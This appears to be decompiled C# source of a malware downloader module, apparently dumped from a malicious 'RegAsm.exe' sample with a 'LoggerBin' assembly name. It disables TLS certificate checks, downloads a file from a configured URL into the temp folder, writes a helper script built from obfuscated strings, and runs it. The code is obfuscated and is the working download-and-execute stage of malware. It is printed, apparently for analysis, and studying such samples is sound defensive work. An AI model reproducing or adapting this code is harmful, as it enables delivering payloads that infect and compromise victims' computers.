// Decompiled with JetBrains decompiler
// Type: CWT.pWy
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using Dy;
using Rv;
using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using VW1;

namespace CWT
{
  internal static class pWy
  {
    public static string Url;
    public static string Filename;
    public static string DownloadedFileFullPath;
    internal static pWy NTK;

    public static void dWA()
    {
      try
      {
        if (Convert.ToBoolean(XWr.EnableDownloader))
        {
          if (Convert.ToBoolean(XWr.DownloaderOnce) && System.IO.File.Exists(pWy.DownloadedFileFullPath))
          {
            ndL.bx(w4.bx(10170, w4.vY), w4.bx(9824, w4.vY) + pWy.DownloadedFileFullPath, ndL.Ldb);
          }
          else
          {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType) 3312;
            pWy.MTs((object) (RemoteCertificateValidationCallback) ((_param1, _param2, _param3, _param4) => true));
            HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(pWy.Url);
            httpWebRequest.Method = w4.bx(10194, w4.vY);
            HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
            int num1 = 0;
            if (pWy.fTV() == null)
              goto label_4;
label_3:
            int num2;
            num1 = num2;
label_4:
            zP zP;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  goto label_19;
                default:
                  Stream responseStream = response.GetResponseStream();
                  using (FileStream fileStream = new FileStream(pWy.DownloadedFileFullPath, FileMode.Create))
                  {
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                      responseStream.CopyTo((Stream) memoryStream);
                      response.Close();
                      responseStream.Dispose();
                      fileStream.Write(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
                    }
                  }
                  zP = new zP(Path.Combine(Path.GetTempPath(), (string) pWy.FTu((object) Path.GetFileNameWithoutExtension(pWy.Filename), (object) w4.bx(10204, w4.vY))));
                  yJ.bx((object) zP, w4.bx(10216, w4.vY) + pWy.DownloadedFileFullPath + w4.bx(10290, w4.vY), yJ.Yd8);
                  yJ.bx((object) zP, w4.bx(10302, w4.vY) + JC.bx((object) zP, JC.HdX) + w4.bx(10416, w4.vY), yJ.Yd8);
                  if (pWy.qTr())
                  {
                    num1 = 1;
                    continue;
                  }
                  goto label_3;
              }
            }
label_19:
            EM.bx((object) zP, EM.idS);
            Ws ws = new Ws(string.Format(w4.bx(10424, w4.vY), (object) zP));
            ndL.bx(w4.bx(10170, w4.vY), pWy.Url + w4.bx(10486, w4.vY), ndL.Ldb);
          }
        }
        else
          ndL.bx(w4.bx(10170, w4.vY), w4.bx(666, w4.vY), ndL.Ldb);
      }
      catch (Exception ex)
      {
        ndL.bx(w4.bx(10170, w4.vY), pWy.Url + w4.bx(10524, w4.vY) + ex.Message, ndL.Ldb);
      }
    }

    static pWy()
    {
      yd.bx(yd.EI);
      pWy.Url = XWr.DownloaderUrl;
      pWy.Filename = XWr.DownloaderFilename;
      pWy.DownloadedFileFullPath = pWy.DownloadedFileFullPath = Path.Combine(Path.GetTempPath(), pWy.Filename);
    }

    internal static void MTs([In] object obj0) => ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback) obj0;

    internal static object FTu([In] object obj0, [In] object obj1) => (object) ((string) obj0 + (string) obj1);

    internal static bool qTr() => pWy.NTK == null;

    internal static pWy fTV() => pWy.NTK;
  }
}
